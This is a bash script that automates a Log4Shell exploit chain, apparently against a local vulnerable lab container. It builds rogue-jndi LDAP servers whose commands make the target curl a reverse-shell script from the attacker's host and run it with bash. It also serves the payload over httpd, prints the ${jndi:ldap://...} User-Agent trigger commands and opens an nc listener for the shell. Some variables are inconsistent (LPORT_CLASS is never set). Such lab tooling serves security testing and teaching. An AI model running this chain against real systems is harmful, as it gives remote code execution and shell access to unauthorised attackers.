#!/bin/bash

if [ "$#" -ne 1 ]; then
    echo "usage : $0 <host_ip>"
    echo "The host_ip from the docker perspective could be found with : sudo docker inspect -f '{{range.NetworkSettings.Networks}}{{.IPAddress}}{{end}}' log4shell-vulnerable-app_vulnapp_1"
    echo "change the last digit to .1 on the previous command"
    exit 1
fi

LHOST=$1
# jndi server1
LPORT_SERVER=4445
# jndi server2
LPORT_SERVER2=4446
#Â class server
LPORT_PAYLOAD=4443
# listener
LPORT=4444

NC='\033[0m'
RED='\033[0;31m'
BLUE='\033[0;34m'

# JNDI server build
if [[ -d marshalsec ]]
  then
     echo -e "${BLUE}[+] rogue-ndi already exist skipp${NC}"
  else
      echo -e "${BLUE}[+] clone rogue-jndi${NC}"
      git clone https://github.com/veracode-research/rogue-jndi
fi

echo -e "${BLUE}[+] build rogue-jndi${NC}"
sudo docker build . -t rogue-jndi

# create revshell 
echo -e "${BLUE}[+] create revshell${NC}"
cd exploit
cp revshell.sample revshell.sh
sed -i "s/LHOST/${LHOST}/g" revshell.sh
sed -i "s/LPORT/${LPORT}/g" revshell.sh
cd ..

# JNDI server start to answer jndi call
echo -e "${BLUE}[+] start rogue server on ${LPORT_SERVER} ${NC}"
sudo docker rm -f rogue-jndi1
sudo docker run -d --rm  --name="rogue-jndi1" -p 0.0.0.0:${LPORT_SERVER}:1389 rogue-jndi --command "curl -q http://${LHOST}:${LPORT_PAYLOAD}/reverse.sh -o /tmp/reverse_shell.sh"

# JNDI server start to launch payload
echo -e "${BLUE}[+] start rogue server on ${LPORT_SERVER2} ${NC}"
sudo docker rm -f rogue-jndi2
sudo docker run -d --rm  --name="rogue-jndi2" -p 0.0.0.0:${LPORT_SERVER2}:1389 rogue-jndi --command "bash /tmp/reverse_shell.sh"

# http server start to deserve the payload
echo -e "${BLUE}[+] start httpd class server on ${LPORT_CLASS}${NC}"
sudo docker rm -f http_payload
sudo docker run -d --name="http_payload" -p 0.0.0.0:${LPORT_CLASS}:80 -v "$(pwd)/exploit:/usr/local/apache2/htdocs/" httpd

# Listen
echo -e "${BLUE}[+] to trig the vuln play : ${NC}${RED}curl 127.0.0.1:8081 -H 'User-Agent: \${jndi:ldap://${LHOST}:${LPORT_SERVER}/o=tomcat}' && sleep 1 && curl 127.0.0.1:8081 -H 'User-Agent: \${jndi:ldap://${LHOST}:${LPORT_SERVER2}/o=tomcat}' ${NC}"
echo -e "${BLUE}[+] listen for reverse shell on ${LPORT}${NC}"
nc -nvlp ${LPORT}

# stop docker instances
echo -e "${BLUE}[+] stop jndi servers${NC}"
sudo docker stop rogue-jndi1
sudo docker stop rogue-jndi2
echo -e "${BLUE}[+] stop httpd server${NC}"
sudo docker stop http_payload
